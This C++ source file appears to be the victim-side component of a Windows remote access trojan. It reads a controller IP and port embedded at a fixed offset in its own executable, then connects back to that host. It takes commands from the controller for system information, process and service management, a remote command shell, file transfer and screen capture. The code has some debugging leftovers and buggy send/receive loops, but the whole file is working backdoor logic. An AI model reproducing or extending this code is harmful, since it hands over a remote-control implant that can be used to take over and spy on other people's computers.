#include "StdAfx.h"
#include "ServSock.h"
#include "ServFileSock.h"
#include "ServScreen.h"
HANDLE hEve = NULL;
CServSock::CServSock(void)
{
	//AllSock = INVALID_SOCKET;
}

CServSock::~CServSock(void)
{
}

SOCKET CServSock::MyConnect(char *ip, UINT port)
{
	WORD wVersionRequested;
	WSADATA wsaData;

	wVersionRequested =	MAKEWORD(2, 2);
	WSAStartup(wVersionRequested, &wsaData);


	SOCKET AllSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (AllSock == INVALID_SOCKET)
	{
		MessageBox(NULL, _T("创建套接字失败!"), _T("tips"), MB_OK);
		return 0;
	}

	sockaddr_in caddr;
	caddr.sin_family = AF_INET;
	caddr.sin_port = htons(port);
	caddr.sin_addr.S_un.S_addr = inet_addr(ip);
	if (SOCKET_ERROR == connect(AllSock, (sockaddr*)&caddr, sizeof(sockaddr_in)))
	{
		MessageBox(NULL, _T("连接失败!"), _T("tips"), MB_OK);
		closesocket(AllSock);
	}
	return AllSock;
}

void CServSock::MyStart()
{
	CloseHandle(CreateThread(NULL, 0, ThreadProc, this, 0, 0));
}

DWORD WINAPI CServSock::ThreadProc(LPVOID lpParameter)
{
	CServSock *pthis = (CServSock*)lpParameter;
	COMMEND commend;
	SOCKET AllSock = INVALID_SOCKET;

	BUILD MyBuild = pthis->MyGetBuildInfo();
	char aIP[40] = {0};
	WideCharToMultiByte(CP_ACP, 0, MyBuild.IP, 40, aIP, 40, NULL, NULL);
	//MessageBoxA(NULL, aIP, "1", NULL);
	/*struct hostent *p = NULL;
	p = gethostbyname(aIP);
	if (p == NULL)
	{
		MessageBoxA(NULL, p, "2", NULL);
		return 0;
	}
	char m_IP[MAX_PATH] = {0};
	wsprintfA(m_IP, "%s", inet_ntoa(*(IN_ADDR*)p->h_addr_list[0]));
	MessageBoxA(NULL, m_IP, "3", NULL);*/

	while(1)
	{
		ZeroMemory(&commend, COMSIZE);
		if (!pthis->MyRecvCommond(AllSock, commend))
		{
			//AllSock = pthis->MyConnect("127.0.0.1", 6789);

			/*BUILD MyBuild = pthis->MyGetBuildInfo();
			char aIP[40] = {0};
			WideCharToMultiByte(CP_ACP, 0, MyBuild.IP, 40, aIP, 40, NULL, NULL);
			MessageBoxA(NULL, aIP, "", NULL);
			struct hostent *p = NULL;
			p = gethostbyname(aIP);
			if (p == NULL)
			{
				return FALSE;
			}
			char m_IP[MAX_PATH] = {0};
			wsprintfA(m_IP, "%s", inet_ntoa(*(IN_ADDR*)p->h_addr_list[0]));
			MessageBoxA(NULL, m_IP, "", NULL);*/
			AllSock = pthis->MyConnect(aIP, MyBuild.port);
		}
		switch (commend.ID)
		{
		case MYGETSYSINFO:
			MessageBox(NULL, _T("MYGETSYSINFO"), _T("TIPS"), NULL);
			//pthis->MySendCommond(AllSock, MYGETSYSINFO, NULL, 0);
			pthis->MyGetInfo(AllSock);
			break;
		case MYEXITPROCESS:
			pthis->MySendCommond(AllSock, MYEXITPROCESS, NULL, 0);
			SetEvent(hEve);
			//ResetEvent(hEve);
			//pthis->MySendCommond(pthis->AllSock,MYGETSYSINFO, NULL, 0);
			break;
		case MYGETPROCESS:
			pthis->m_ServProcess.ProcessCommend(commend, AllSock);
			break;
		case MYCMDSHELL:
			pthis->m_ServCmd.MyCmdCommend(commend, AllSock);
			break;
		case MYSVCMANAGE:
			pthis->m_ServSVC.MySvcCommend(commend, AllSock);
			break;
		case MYFILEMANAGE:
			pthis->m_ServFile.FileCommend(commend, AllSock);
			break;
		case FILESOCKSTART:
			pthis->m_ServFileSock->FileSockStart(commend);
			break;
		case MYSCREENMANAGE:
			pthis->m_ServScreen.ScreenCommand(commend, AllSock);
			break;
		default:
			break;
		}
		
	}
	return AllSock;
}

BOOL CServSock::MySelect(SOCKET sk)
{
	fd_set fs;
	FD_ZERO(&fs);
	FD_SET(sk,&fs);
	timeval tv;
	tv.tv_sec = 0;
	tv.tv_usec =1000;
	int bse = 0;
	bse = select(0,&fs,0,0,&tv); //可读
	if (bse<=0)
	{
		return FALSE;
	}
	else if (FD_ISSET(sk,&fs))
	{
		return TRUE;
	}
	return FALSE;
}

BOOL CServSock::MySendCommond(SOCKET sk, int Id, char *text, int size, int fd)
{
	COMMEND cmd;
	ZeroMemory(&cmd, COMSIZE);
	cmd.ID = Id;
	if (text != NULL)
	{
		memcpy(cmd.teste, text, size);
	}
	cmd.fID = fd;

	char *buf = new char[COMSIZE];
	ZeroMemory(buf, COMSIZE);
	memcpy(buf, &cmd, COMSIZE);
	int nleft = COMSIZE;
	int idx = 0;
	while(nleft > 0)
	{
		int dx = send(sk, &buf[idx], COMSIZE, 0);
		if (dx == SOCKET_ERROR)
		{
			return FALSE;
		}
		nleft = nleft - dx;
		idx += idx;
	}
	delete []buf;

	return TRUE;
}

BOOL CServSock::MyRecvCommond(SOCKET sk, COMMEND &cmd)
{
	ZeroMemory(&cmd, COMSIZE);

	char *buf = new char[COMSIZE];
	ZeroMemory(buf, COMSIZE);

	int nleft = COMSIZE;
	int idx = 0;
	while(nleft > 0)
	{
		int dx = recv(sk, &buf[idx], COMSIZE, 0);
		if (dx == SOCKET_ERROR)
		{
			return FALSE;
		}
		nleft = nleft - dx;
		idx += idx;
	}
	memcpy(&cmd, buf, COMSIZE);
	delete []buf;

	return TRUE;
}

void CServSock::MyGetInfo(SOCKET sk)
{
	SYSINFO sinfo;
	ZeroMemory(&sinfo,sizeof(SYSINFO));
	//获取计算机名称;
	DWORD lpnSize;
	wchar_t tem[40]={0};
	GetComputerName(tem,&lpnSize);
	wsprintfW(sinfo.cmpname,_T("%s"),tem);
	//内存大小;
	MEMORYSTATUSEX mex;
	mex.dwLength = sizeof(MEMORYSTATUSEX);
	GlobalMemoryStatusEx(&mex);
	//sinfo.MemSize = mex.ullAvailPageFile/1024/1024;
	wchar_t msit[15]={0};
	wsprintfW(msit,_T("%d"),mex.ullTotalPhys/1024/1024);
	sinfo.memsize = _wtoi(msit);

	//操作系统版本;
	OSVERSIONINFO os;
	os.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&os);
	int iosp = -1;
	if (os.dwPlatformId==VER_PLATFORM_WIN32_NT)
	{	
		if (os.dwMajorVersion==5)
		{
			switch (os.dwMinorVersion)
			{
			case 0:
				iosp = 1;//	Windows 2000		
				break;
			case 1:
				iosp = 2;//Windows XP
				break;
			case 2:
				iosp = 3;//Windows Server 2003
			default:
				//iosp = 6;
				break;
			}
		}else if(os.dwMajorVersion==6)
		{
			switch (os.dwMinorVersion)
			{
			case 0:
				iosp = 4;//	Windows Vista	
				break;
			case 1:
				iosp = 5;//Windows Server 2008/Windows 7
				break;
			default:
				//iosp = 6;
				break;
			}
		}
		sinfo.OS = iosp;
	}
	MySendCommond(sk,MYGETSYSINFO,(char*)&sinfo,sizeof(sinfo));
}

//获取结构体信息
BUILD CServSock::MyGetBuildInfo(void)
{
	BUILD m_build;
	ZeroMemory(&m_build, sizeof(BUILD));
	wchar_t FilePath[MAX_PATH] = {0};
	GetModuleFileName(NULL, FilePath, MAX_PATH);
	HANDLE hFile = CreateFile(FilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, NULL, NULL);
	SetFilePointer(hFile, 0x97c50, 0, FILE_BEGIN);
	DWORD rfile = 0;
	ReadFile(hFile, (LPVOID)&m_build, sizeof(BUILD), &rfile, NULL);
	CloseHandle(hFile);
	return m_build;
}
